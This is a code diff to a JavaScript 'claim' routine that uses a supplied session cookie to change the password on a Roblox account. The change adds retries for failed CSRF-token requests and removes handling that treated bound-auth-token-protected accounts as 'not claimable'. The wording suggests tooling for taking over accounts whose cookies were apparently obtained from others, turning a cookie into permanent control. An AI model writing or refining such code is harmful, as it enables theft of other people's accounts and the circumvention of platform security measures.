@@ -73,20 +73,29 @@ async function claim(cookie, currentPassword, newPassword) {
 
     const body = JSON.stringify({ currentPassword, newPassword });
 
-    // 1) Prime the CSRF token (no token -> 403 with x-csrf-token header; nothing changes)
-    const probe = await fetch(CHANGE_URL, {
-      method: "POST", credentials: "include",
-      headers: { "content-type": "application/json" }, body
-    });
-    const csrf = probe.headers.get("x-csrf-token");
+    // 1) Prime the CSRF token. A live session returns 403 + x-csrf-token here (nothing
+    // changes yet). If it comes back WITHOUT a token — typically 401 ("not authenticated")
+    // or 429 (rate limited) — the session is being throttled or was just invalidated, so
+    // retry once after a short pause before giving up. (This is NOT a region/US thing:
+    // a live cookie from any country returns 403 + token here.)
+    let csrf = null, lastStatus = 0;
+    for (let attempt = 0; attempt < 2; attempt++) {
+      const probe = await fetch(CHANGE_URL, {
+        method: "POST", credentials: "include",
+        headers: { "content-type": "application/json" }, body
+      });
+      lastStatus = probe.status;
+      csrf = probe.headers.get("x-csrf-token");
+      if (csrf) break;
+      if (attempt === 0) await new Promise((r) => setTimeout(r, 1200));
+    }
     if (!csrf) {
-      // Roblox's bound-auth-token (rolled out on US accounts first): the cookie is valid
-      // everywhere else, but auth.roblox.com refuses the password change with 401 and no
-      // CSRF token. A cookie can't produce the required signed token -> not claimable.
-      if (probe.status === 401) {
-        return { ok: false, blocked: true, error: "US account — Roblox blocks cookie password change (bound-auth-token). Not claimable.", userId: me.id, name: me.name };
-      }
-      return { ok: false, error: "no CSRF token (HTTP " + probe.status + ")", userId: me.id, name: me.name };
+      // Cookie passed the auth check but the password-change endpoint still refuses it.
+      // The session is invalid/expired or rate-limited — retryable, not a permanent block.
+      const why = lastStatus === 429
+        ? "rate limited (HTTP 429) — wait a bit and retry"
+        : "session invalid/expired (HTTP " + lastStatus + ") — regenerate the cookie or retry";
+      return { ok: false, retryable: true, error: "Can't claim: " + why, userId: me.id, name: me.name };
     }
 
     // 2) Real password change
